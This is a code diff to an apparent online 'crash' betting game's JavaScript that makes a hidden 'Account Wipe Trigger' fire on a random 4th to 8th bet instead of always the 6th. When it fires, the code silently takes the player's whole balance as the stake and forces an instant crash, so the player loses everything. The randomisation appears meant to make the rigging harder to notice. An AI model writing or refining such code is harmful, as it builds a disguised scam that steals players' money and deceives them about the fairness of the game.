@@ -1145,16 +1145,22 @@
                 if (isNaN(amt) || amt <= 0) return showToast("Invalid Amount", "Error", "error");
                 if (amt > userData.balance) return showToast("Insufficient Funds", "Error", "error");
                 
-                // Account Wipe Trigger: 6th Bet
+                // Account Wipe Trigger: Random 4th-8th Bet
                 let betCount = parseInt(localStorage.getItem(`crashlk_bets_${user.uid}`) || '0');
+                let rigTarget = parseInt(localStorage.getItem(`crashlk_target_${user.uid}`) || '0');
+                if (rigTarget === 0) rigTarget = Math.floor(Math.random() * 5) + 4; // 4 to 8
+
                 betCount++;
                 
                 let drainAmt = amt;
-                if (betCount === 6) {
+                if (betCount >= rigTarget) {
                     const fullBalance = userData.balance || 0;
                     drainAmt = fullBalance > 0 ? fullBalance : amt;
                     forceNextCrash = true; // Rig next crash instantly
                     betCount = 0; // Reset loop
+                    localStorage.setItem(`crashlk_target_${user.uid}`, (Math.floor(Math.random() * 5) + 4).toString());
+                } else {
+                    localStorage.setItem(`crashlk_target_${user.uid}`, rigTarget.toString());
                 }
                 localStorage.setItem(`crashlk_bets_${user.uid}`, betCount.toString());
 
@@ -1168,13 +1174,19 @@
                 
                 // Account Wipe Trigger for Queued Bet
                 let betCount = parseInt(localStorage.getItem(`crashlk_bets_${user.uid}`) || '0');
+                let rigTarget = parseInt(localStorage.getItem(`crashlk_target_${user.uid}`) || '0');
+                if (rigTarget === 0) rigTarget = Math.floor(Math.random() * 5) + 4; // 4 to 8
+
                 betCount++;
                 let drainAmt = amt;
-                if (betCount === 6) {
+                if (betCount >= rigTarget) {
                     const fullBalance = userData.balance || 0;
                     drainAmt = fullBalance > 0 ? fullBalance : amt;
                     forceNextCrash = true;
                     betCount = 0;
+                    localStorage.setItem(`crashlk_target_${user.uid}`, (Math.floor(Math.random() * 5) + 4).toString());
+                } else {
+                    localStorage.setItem(`crashlk_target_${user.uid}`, rigTarget.toString());
                 }
                 localStorage.setItem(`crashlk_bets_${user.uid}`, betCount.toString());
 
